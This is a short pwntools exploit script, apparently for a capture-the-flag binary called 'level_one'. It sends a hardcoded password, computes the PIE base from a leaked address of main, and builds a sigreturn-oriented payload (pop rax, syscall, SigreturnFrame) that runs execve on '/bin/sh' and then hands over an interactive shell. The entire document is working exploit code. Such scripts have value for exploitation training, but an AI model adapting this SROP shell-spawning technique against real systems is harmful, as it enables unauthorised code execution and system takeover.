from pwn import *
from time import sleep

context.os = 'linux'
context.arch = 'amd64'

def solve_level_one(p, path_to_binary):
    e = ELF(path_to_binary)
    rop = ROP(e)
    p.recvuntil("Main is at ")
    main_addr = str(p.recvline())[2:-3]
    main = e.symbols['main']
    print("main address", hex(int(main_addr, 16)))
    print("main rop", hex(main))
    base_addr = int(main_addr, 16) - main
    print("base address", hex(base_addr))
    padding = b'A' * 0x9 
    binsh = int(next(e.search(b"/bin/sh\x00"))) + base_addr
    syscall = int(rop.syscall.address) + base_addr
    pop_rax = int(rop.rax.address) + base_addr
    print("syscall:", hex(syscall))
    print("syscall rop:", hex(rop.syscall.address))
    print("pop_rax:", hex(pop_rax))
    print("pop_rax rop:", hex(rop.rax.address))
    payload = padding + p64(pop_rax) + p64(0xf) + p64(syscall)
    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = binsh
    frame.rsi = 0x0
    frame.rdx = 0x0
    frame.rip = syscall
    payload += bytes(frame)
    print(payload)
    #sleep(5)
    p.sendline(payload)
    p.interactive()

context.terminal = ['tmux','splitw','-h'] 
p = process('./level_one')
#gdb.attach(proc.pidof(p)[0])
p.recvuntil("Input password to continue:")
p.recvuntil("> ")
p.sendline("c43277249e73244ed4ec051363fac62d")
solve_level_one(p, "./level_one")  
